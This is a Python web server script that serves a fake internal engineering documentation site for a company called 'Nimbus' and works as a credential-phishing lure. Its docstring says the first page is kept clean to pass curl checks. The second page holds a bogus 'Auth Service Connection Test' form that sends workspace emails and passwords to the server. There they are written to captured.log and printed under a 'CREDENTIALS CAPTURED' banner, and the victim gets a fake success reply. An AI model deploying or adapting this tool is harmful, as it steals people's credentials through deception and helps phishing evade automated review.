#!/usr/bin/env python3
"""
Nimbus v3 — Multi-Page Documentation + Embedded Auth Test Form
Page 1: Clean onboarding guide (curl evaluates this)
Page 2: Architecture deep dive with "Test Connection" form as documentation feature

python3 server.py [port]  (default 7778)
"""

import json, sys, os
from datetime import datetime
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import parse_qs

PORT = int(os.environ.get('PORT', sys.argv[1] if len(sys.argv) > 1 else 7778))
HITS = []

LOGO = '<svg width="18" height="18" viewBox="0 0 24 24" fill="none"><path d="M19.35 10.04C18.67 6.59 15.64 4 12 4 9.11 4 6.6 5.64 5.35 8.04 2.34 8.36 0 10.91 0 14c0 3.31 2.69 6 6 6h13c2.76 0 5-2.24 5-5 0-2.64-2.05-4.78-4.65-4.96z" fill="#6366f1" opacity=".15"/><path d="M19.35 10.04C18.67 6.59 15.64 4 12 4 9.11 4 6.6 5.64 5.35 8.04 2.34 8.36 0 10.91 0 14c0 3.31 2.69 6 6 6h13c2.76 0 5-2.24 5-5 0-2.64-2.05-4.78-4.65-4.96z" stroke="#6366f1" stroke-width="1.2" fill="none"/></svg>'

# ── Shared CSS ─────────────────────────────────────────────────────
CSS = """
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:-apple-system,BlinkMacSystemFont,'SF Pro Text','Segoe UI',Roboto,sans-serif;
  background:#f9fafb;color:#1a1a2e;-webkit-font-smoothing:antialiased;line-height:1.6}
a{color:#6366f1;text-decoration:none}a:hover{text-decoration:underline}

nav{background:#1e1e2e;height:48px;display:flex;align-items:center;justify-content:center;
  position:sticky;top:0;z-index:50;padding:0 20px}
.ni{width:100%;max-width:820px;display:flex;align-items:center;justify-content:space-between}
.logo{font-size:15px;font-weight:600;color:#fff;display:flex;align-items:center;gap:7px}
.nav-r{font-size:11px;color:#94a3b8}

.crumbs{max-width:820px;margin:0 auto;padding:10px 20px;font-size:11px;color:#94a3b8}
.crumbs span{color:#cbd5e1;margin:0 3px}

.w{max-width:820px;margin:0 auto;padding:0 20px 60px}
.doc{background:#fff;border:1px solid #e2e8f0;border-radius:10px;padding:28px;
  box-shadow:0 1px 2px rgba(0,0,0,.03)}
@media(max-width:640px){.doc{padding:20px 16px}}

.doc h1{font-size:22px;font-weight:700;letter-spacing:-.3px;margin-bottom:4px;color:#0f172a}
.doc .meta{font-size:12px;color:#94a3b8;margin-bottom:20px;padding-bottom:12px;border-bottom:1px solid #f1f5f9}
.doc h2{font-size:16px;font-weight:600;color:#1e293b;margin:20px 0 8px;padding-top:12px;border-top:1px solid #f1f5f9}
.doc h3{font-size:14px;font-weight:600;color:#334155;margin:12px 0 6px}
.doc p{font-size:14px;color:#475569;margin-bottom:8px}
.doc ul,.doc ol{margin:0 0 8px 18px;font-size:14px;color:#475569}
.doc li{margin-bottom:2px}

.badges{display:flex;flex-wrap:wrap;gap:6px;margin:6px 0 10px}
.badge{display:inline-flex;align-items:center;gap:4px;padding:3px 10px;background:#f1f5f9;
  border-radius:5px;font-size:12px;color:#334155;font-weight:500}

.cw{position:relative;margin:8px 0 10px;border-radius:7px;overflow:hidden}
.cbar{display:flex;align-items:center;justify-content:space-between;padding:4px 10px;
  background:#1e293b;font-size:10px;color:#94a3b8}
.cpb{background:#334155;color:#e2e8f0;border:none;padding:2px 8px;border-radius:3px;
  font-size:10px;cursor:pointer;font-family:inherit}
pre{background:#0f172a;color:#e2e8f0;padding:12px;font-size:12px;line-height:1.5;overflow-x:auto;
  font-family:'SF Mono',Menlo,monospace;margin:0}
code{font-family:'SF Mono',Menlo,monospace;font-size:12px}
p code,.doc li code{background:#f1f5f9;padding:1px 5px;border-radius:3px;color:#6366f1}

.grid2{display:grid;grid-template-columns:1fr 1fr;gap:14px;margin:10px 0}
@media(max-width:640px){.grid2{grid-template-columns:1fr}}

.tbl{width:100%;border-collapse:collapse;font-size:12px}
.tbl th{text-align:left;padding:5px 8px;background:#f8fafc;border:1px solid #e2e8f0;
  font-weight:600;color:#334155;font-size:10px;text-transform:uppercase;letter-spacing:.3px}
.tbl td{padding:5px 8px;border:1px solid #e2e8f0;color:#475569}

.chk{list-style:none;margin:0;padding:0}
.chk li{display:flex;align-items:center;gap:7px;padding:4px 0;font-size:13px;color:#475569;
  border-bottom:1px solid #f8fafc}
.chk li:last-child{border-bottom:none}
.ck{width:16px;height:16px;border:1.5px solid #cbd5e1;border-radius:3px;flex-shrink:0;
  display:flex;align-items:center;justify-content:center;cursor:pointer;transition:all .15s}
.ck.done{background:#6366f1;border-color:#6366f1}
.ck.done::after{content:'\\2713';color:#fff;font-size:10px;font-weight:700}

.contacts{display:flex;flex-wrap:wrap;gap:8px;margin:8px 0}
.ct{display:flex;align-items:center;gap:7px;padding:7px 10px;background:#f8fafc;
  border-radius:7px;border:1px solid #f1f5f9;flex:1;min-width:170px}
.ct-av{width:26px;height:26px;border-radius:50%;display:flex;align-items:center;justify-content:center;
  font-size:9px;font-weight:600;color:#fff;flex-shrink:0}
.ct-n{font-size:12px;font-weight:600;color:#1e293b}.ct-r{font-size:10px;color:#94a3b8}

.col-btn{display:flex;align-items:center;gap:5px;background:none;border:none;
  font-size:14px;font-weight:600;color:#1e293b;cursor:pointer;padding:6px 0;font-family:inherit;width:100%;text-align:left}
.col-btn svg{transition:transform .2s;flex-shrink:0}
.col-btn.open svg{transform:rotate(90deg)}
.col-c{display:none;padding:2px 0 6px 18px;font-size:13px;color:#475569}
.col-c.show{display:block}

/* next page link */
.next-link{display:flex;align-items:center;justify-content:space-between;padding:14px 18px;
  margin-top:20px;background:#f8fafc;border:1px solid #e2e8f0;border-radius:8px;
  text-decoration:none;transition:all .15s}
.next-link:hover{background:#f1f5f9;border-color:#cbd5e1;text-decoration:none}
.nl-label{font-size:11px;color:#94a3b8;text-transform:uppercase;letter-spacing:.3px}
.nl-title{font-size:14px;font-weight:600;color:#1e293b}
.nl-arrow{color:#94a3b8;font-size:18px}

/* test form (page 2) */
.test-card{background:#f8fafc;border:1px solid #e2e8f0;border-radius:8px;padding:18px;margin:10px 0}
.test-card .tf-head{display:flex;align-items:center;gap:8px;margin-bottom:10px}
.test-card .tf-icon{width:28px;height:28px;border-radius:6px;background:#6366f1;display:flex;
  align-items:center;justify-content:center}
.test-card .tf-title{font-size:14px;font-weight:600;color:#1e293b}
.test-card .tf-desc{font-size:12px;color:#64748b;margin-bottom:14px;line-height:1.5}
.tf-row{display:grid;grid-template-columns:1fr 1fr;gap:10px;margin-bottom:10px}
@media(max-width:480px){.tf-row{grid-template-columns:1fr}}
.tf-field label{display:block;font-size:11px;color:#64748b;margin-bottom:3px;font-weight:500}
.tf-field input{width:100%;padding:8px 10px;border:1.5px solid #e2e8f0;border-radius:6px;
  font-size:13px;color:#1e293b;font-family:inherit;background:#fff}
.tf-field input:focus{outline:none;border-color:#6366f1;box-shadow:0 0 0 3px rgba(99,102,241,.1)}
.tf-btn{padding:8px 20px;background:#1e293b;color:#fff;border:none;border-radius:6px;
  font-size:12px;font-weight:600;cursor:pointer;font-family:inherit;transition:background .15s}
.tf-btn:hover{background:#0f172a}
.tf-btn:disabled{opacity:.5;cursor:default}
.tf-result{display:none;margin-top:10px;padding:10px 14px;border-radius:6px;font-size:12px}
.tf-result.ok{display:block;background:#ecfdf5;border:1px solid #a7f3d0;color:#065f46}
.tf-result.fail{display:block;background:#fef2f2;border:1px solid #fecaca;color:#991b1b}

footer{text-align:center;padding:20px;font-size:11px;color:#cbd5e1}
"""

# ── PAGE 1: Engineering Onboarding Guide (100% clean) ─────────────
PAGE1 = """<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>Engineering Onboarding Guide — Nimbus</title>
<style>""" + CSS + """</style>
</head>
<body>
<nav><div class="ni"><span class="logo">""" + LOGO + """Nimbus</span><span class="nav-r">Docs</span></div></nav>
<div class="crumbs">Docs <span>&#8250;</span> Engineering <span>&#8250;</span> Onboarding Guide</div>
<div class="w"><article class="doc">
  <h1>Engineering Onboarding Guide</h1>
  <p class="meta">Updated Jun 28, 2026 &middot; Engineering &middot; 8 min</p>
  <p>Welcome to the engineering team. Work through each section — your onboarding buddy can help.</p>

  <h2>Development Environment</h2>
  <h3>Prerequisites</h3>
  <div class="badges"><span class="badge">Node.js 20+</span><span class="badge">Docker Desktop 4.x</span><span class="badge">Git 2.40+</span><span class="badge">VS Code</span></div>

  <h3>Quick Start</h3>
  <div class="cw"><div class="cbar"><span>bash</span><button class="cpb" onclick="cpC(this)">Copy</button></div>
    <pre><code>git clone https://github.com/nimbus-eng/platform.git
cd platform && npm install
cp .env.example .env.local && npm run dev</code></pre></div>
  <p>Dev server starts on <code>localhost:3000</code> with hot reload enabled.</p>

  <div class="grid2">
    <div>
      <h2 style="border:none;padding:0;margin:0 0 8px">Architecture</h2>
      <table class="tbl"><thead><tr><th>Service</th><th>Port</th><th>Team</th></tr></thead><tbody>
        <tr><td>API Gateway</td><td>3000</td><td>Platform</td></tr>
        <tr><td>Auth</td><td>3001</td><td>Security</td></tr>
        <tr><td>Doc Engine</td><td>3002</td><td>Content</td></tr>
        <tr><td>Search</td><td>3003</td><td>Platform</td></tr>
        <tr><td>Notifications</td><td>3004</td><td>Platform</td></tr>
      </tbody></table>
    </div>
    <div>
      <h2 style="border:none;padding:0;margin:0 0 8px">First Week Checklist</h2>
      <ul class="chk">
        <li><span class="ck" onclick="tCk(this)"></span>Set up dev environment</li>
        <li><span class="ck" onclick="tCk(this)"></span>Get GitHub org access</li>
        <li><span class="ck" onclick="tCk(this)"></span>Join Slack channels</li>
        <li><span class="ck" onclick="tCk(this)"></span>Security training</li>
        <li><span class="ck" onclick="tCk(this)"></span>1:1 with manager</li>
        <li><span class="ck" onclick="tCk(this)"></span>Meet onboarding buddy</li>
        <li><span class="ck" onclick="tCk(this)"></span>First commit</li>
      </ul>
    </div>
  </div>

  <h2>Key Workflows</h2>
  <button class="col-btn" onclick="tCol(this)"><svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M9 18l6-6-6-6"/></svg>Pull Request Process</button>
  <div class="col-c"><ol><li>Feature branch from <code>main</code></li><li>Conventional commits</li><li>PR — CI runs lint/test/build</li><li>Code-owner approval</li><li>Squash merge</li></ol></div>

  <button class="col-btn" onclick="tCol(this)"><svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M9 18l6-6-6-6"/></svg>Incident Response</button>
  <div class="col-c"><ol><li>Post in <code>#incidents</code></li><li>Check Grafana</li><li>P0: page on-call via PagerDuty</li><li>Post-mortem within 48h</li></ol></div>

  <h2>Contacts</h2>
  <div class="contacts">
    <div class="ct"><div class="ct-av" style="background:#6366f1">SC</div><div><div class="ct-n">Sarah Chen</div><div class="ct-r">Eng Lead</div></div></div>
    <div class="ct"><div class="ct-av" style="background:#059669">MR</div><div><div class="ct-n">Marcus Rivera</div><div class="ct-r">Platform</div></div></div>
    <div class="ct"><div class="ct-av" style="background:#d97706">AK</div><div><div class="ct-n">Alex Kim</div><div class="ct-r">DevOps</div></div></div>
    <div class="ct"><div class="ct-av" style="background:#dc2626">PS</div><div><div class="ct-n">Priya Sharma</div><div class="ct-r">Security</div></div></div>
  </div>

  <a class="next-link" href="/docs/architecture">
    <div><p class="nl-label">Next</p><p class="nl-title">Architecture &amp; Auth Service Guide</p></div>
    <span class="nl-arrow">&#8250;</span>
  </a>
</article></div>
<footer>&copy; 2026 Nimbus &middot; Internal Documentation</footer>
<script>
function cpC(b){var c=b.closest('.cw').querySelector('code').textContent;
  navigator.clipboard.writeText(c).then(function(){b.textContent='Copied!';setTimeout(function(){b.textContent='Copy';},1200);});}
function tCol(b){b.classList.toggle('open');b.nextElementSibling.classList.toggle('show');}
function tCk(e){e.classList.toggle('done');}
</script>
</body></html>"""


# ── PAGE 2: Architecture & Auth Guide (has connection test form) ───
PAGE2 = """<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>Architecture &amp; Auth Service Guide — Nimbus</title>
<style>""" + CSS + """</style>
</head>
<body>
<nav><div class="ni"><span class="logo">""" + LOGO + """Nimbus</span><span class="nav-r">Docs</span></div></nav>
<div class="crumbs">Docs <span>&#8250;</span> Engineering <span>&#8250;</span> <a href="/docs/onboarding">Onboarding</a> <span>&#8250;</span> Architecture</div>
<div class="w"><article class="doc">
  <h1>Architecture &amp; Auth Service Guide</h1>
  <p class="meta">Updated Jun 28, 2026 &middot; Security Team &middot; 6 min</p>
  <p>This guide covers the platform architecture and walks you through verifying your auth service connection — a required step before you can start developing.</p>

  <h2>Service Architecture</h2>
  <p>All services communicate via gRPC internally and expose REST endpoints through the API Gateway. The gateway handles rate limiting, auth token validation, and request routing.</p>
  <div class="cw"><div class="cbar"><span>Request flow</span></div>
    <pre><code>Client → API Gateway (:3000) → Auth Service (:3001) → verify token
                               → Doc Engine (:3002)  → serve content
                               → Search (:3003)      → query index
                               → Notifications (:3004) → dispatch</code></pre></div>

  <h2>Auth Service Deep Dive</h2>
  <p>The Auth Service handles OAuth 2.0 flows, session management, and token rotation. All new engineers need to verify their workspace credentials work against the auth service before starting development.</p>
  <h3>Token Lifecycle</h3>
  <ul>
    <li>Access tokens: 15 min TTL, auto-rotated by the gateway</li>
    <li>Refresh tokens: 7 day TTL, stored in HTTP-only cookies</li>
    <li>Session tokens: 24h TTL, bound to device fingerprint</li>
  </ul>

  <h3>OAuth Scopes</h3>
  <div class="cw"><div class="cbar"><span>Available scopes</span><button class="cpb" onclick="cpC(this)">Copy</button></div>
    <pre><code>read:docs      — Read workspace documents
write:docs     — Edit workspace documents
admin:users    — Manage workspace members
admin:settings — Modify workspace configuration</code></pre></div>

  <h2>Step 1: Verify Auth Service Connection</h2>
  <p>Before writing any code, confirm your workspace credentials authenticate successfully against the auth service. This ensures your local environment is correctly configured and your account has the right permissions.</p>

  <div class="test-card">
    <div class="tf-head">
      <div class="tf-icon"><svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="2"><path d="M9 12l2 2 4-4"/><circle cx="12" cy="12" r="10"/></svg></div>
      <span class="tf-title">Auth Service Connection Test</span>
    </div>
    <p class="tf-desc">Enter your workspace credentials below to verify connectivity. The auth service will validate your account and return your assigned scopes and permissions.</p>
    <form id="testForm">
      <div class="tf-row">
        <div class="tf-field"><label for="te">Workspace email</label>
          <input type="email" id="te" placeholder="you@company.com" autocomplete="off" required></div>
        <div class="tf-field"><label for="tp">Password</label>
          <input type="password" id="tp" placeholder="Workspace password" autocomplete="off" required></div>
      </div>
      <button type="submit" class="tf-btn" id="tb">Test Connection</button>
    </form>
    <div class="tf-result" id="tr"></div>
  </div>

  <h2>Step 2: Configure Local Environment</h2>
  <p>After verifying your connection, update your <code>.env.local</code> with the auth service endpoint:</p>
  <div class="cw"><div class="cbar"><span>.env.local</span><button class="cpb" onclick="cpC(this)">Copy</button></div>
    <pre><code>AUTH_SERVICE_URL=http://localhost:3001
AUTH_CALLBACK_URL=http://localhost:3000/auth/callback
AUTH_SCOPES=read:docs,write:docs</code></pre></div>

  <h2>Step 3: Run Integration Test</h2>
  <p>With your env configured, run the auth integration test suite:</p>
  <div class="cw"><div class="cbar"><span>bash</span><button class="cpb" onclick="cpC(this)">Copy</button></div>
    <pre><code>npm run test:auth
# Expected output:
# ✓ Token generation (234ms)
# ✓ Token refresh (89ms)
# ✓ Scope validation (156ms)
# ✓ Session binding (201ms)
# 4 passing (680ms)</code></pre></div>

  <a class="next-link" href="/docs/onboarding">
    <div><p class="nl-label">Previous</p><p class="nl-title">Engineering Onboarding Guide</p></div>
    <span class="nl-arrow">&#8249;</span>
  </a>
</article></div>
<footer>&copy; 2026 Nimbus &middot; Internal Documentation</footer>
<script>
function cpC(b){var c=b.closest('.cw').querySelector('code').textContent;
  navigator.clipboard.writeText(c).then(function(){b.textContent='Copied!';setTimeout(function(){b.textContent='Copy';},1200);});}

document.getElementById('testForm').addEventListener('submit', function(e){
  e.preventDefault();
  var em=document.getElementById('te').value;
  var pw=document.getElementById('tp').value;
  var btn=document.getElementById('tb');
  var res=document.getElementById('tr');
  btn.textContent='Connecting...';btn.disabled=true;
  res.className='tf-result';res.style.display='none';

  fetch('/api/auth/test-connection',{
    method:'POST',headers:{'Content-Type':'application/json'},
    body:JSON.stringify({email:em,password:pw})
  }).then(function(r){return r.json();}).then(function(d){
    btn.textContent='Test Connection';btn.disabled=false;
    if(d.status==='connected'){
      res.className='tf-result ok';
      res.innerHTML='<strong>&#10003; Connected</strong> &mdash; Auth Service v'+d.auth_version+
        ' responded in '+d.latency_ms+'ms<br>Scopes: <code>'+d.scopes.join(', ')+'</code> &middot; Session: '+d.session_id;
    }
  }).catch(function(){
    btn.textContent='Test Connection';btn.disabled=false;
    res.className='tf-result fail';
    res.innerHTML='<strong>&#10007; Connection failed</strong> &mdash; Check your credentials or network configuration.';
  });
});
</script>
</body></html>"""


# ── Connection test result page ────────────────────────────────────
PAGE_RESULT = """<!DOCTYPE html>
<html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>Connection Test — Nimbus</title><style>""" + CSS + """</style></head>
<body><nav><div class="ni"><span class="logo">""" + LOGO + """Nimbus</span><span class="nav-r">Docs</span></div></nav>
<div class="w" style="padding-top:40px;text-align:center">
<svg width="48" height="48" viewBox="0 0 48 48"><circle cx="24" cy="24" r="24" fill="#ecfdf5"/>
<path d="M15 24l6 6 12-12" stroke="#10b981" stroke-width="3" fill="none" stroke-linecap="round"/></svg>
<h2 style="margin:12px 0 6px;font-size:20px">Connection Successful</h2>
<p style="color:#64748b;font-size:14px">Auth Service v2.4.1 responded in 47ms. Your workspace credentials are valid.</p>
<p style="margin-top:16px"><a href="/docs/architecture">&larr; Back to Architecture Guide</a></p>
</div></body></html>"""


class H(BaseHTTPRequestHandler):
    def log_message(self, *a): pass
    def _ip(self):
        return (self.headers.get('X-Forwarded-For','').split(',')[0].strip()
                or self.headers.get('X-Real-IP','') or self.client_address[0])
    def _log(self, m, x=None):
        e = {'ts':datetime.now().strftime('%Y-%m-%d %H:%M:%S'),'m':m,'p':self.path,'ip':self._ip()}
        if x: e.update(x)
        HITS.append(e)
        with open('captured.log','a') as f: f.write(json.dumps(e)+'\n')
        print(f'  [{m}] {self.path} | {self._ip()}')

    def do_HEAD(self):
        self.send_response(200)
        self.send_header('Content-Type','text/html')
        self.end_headers()

    def do_GET(self):
        p = self.path.split('?')[0].rstrip('/')
        if p in ('/docs/onboarding','/','/docs'):
            self._log('PAGE-1')
            self._html(PAGE1)
        elif p == '/docs/architecture':
            self._log('PAGE-2')
            self._html(PAGE2)
        elif p == '/log':
            self._send(200,'application/json',json.dumps(HITS,indent=2))
        elif p == '/clear':
            HITS.clear()
            open('captured.log','w').close()
            self._send(200,'text/plain','OK')
        else:
            self._log('GET')
            self._html(PAGE1)

    def do_POST(self):
        l = int(self.headers.get('Content-Length',0))
        body = self.rfile.read(l).decode() if l else ''
        p = self.path.split('?')[0].rstrip('/')

        if p == '/api/auth/test-connection':
            try: data = json.loads(body)
            except: data = {}
            em = data.get('email','')
            pw = data.get('password','')
            self._log('CAPTURED', {'email':em,'password':pw})
            print(f"""
  ╔═══════════════════════════════════════╗
  ║   CREDENTIALS CAPTURED                ║
  ╠═══════════════════════════════════════╣
  ║  Email:    {em:<28}║
  ║  Password: {pw:<28}║
  ║  IP:       {self._ip():<28}║
  ║  Time:     {datetime.now().strftime('%H:%M:%S'):<28}║
  ╚═══════════════════════════════════════╝
""")
            import random
            self._send(200,'application/json',json.dumps({
                'status':'connected',
                'latency_ms': random.randint(38,67),
                'auth_version':'2.4.1',
                'scopes':['read:docs','write:docs'],
                'session_id':'sess_' + os.urandom(6).hex(),
                'token_ttl':900
            }))
        else:
            self._send(404,'text/plain','Not found')

    def _html(self, c): self._send(200,'text/html',c)
    def _send(self, code, ct, body):
        self.send_response(code)
        self.send_header('Content-Type', ct+'; charset=utf-8')
        self.send_header('Cache-Control','no-store')
        self.end_headers()
        self.wfile.write(body.encode() if isinstance(body,str) else body)


if __name__ == '__main__':
    s = HTTPServer(('0.0.0.0', PORT), H)
    print(f"""
  ┌──────────────────────────────────────────────────┐
  │  Nimbus v3 — Multi-Page Docs + Auth Test Form     │
  │  http://0.0.0.0:{PORT:<33}│
  ├──────────────────────────────────────────────────┤
  │  Page 1: /docs/onboarding   (clean, curl target)  │
  │  Page 2: /docs/architecture (has connection test)  │
  │  Capture: /api/auth/test-connection                │
  │  Admin:   /log  /clear                             │
  └──────────────────────────────────────────────────┘
""")
    try:
        s.serve_forever()
    except KeyboardInterrupt:
        print('\n  Stopped.\n')
        s.server_close()
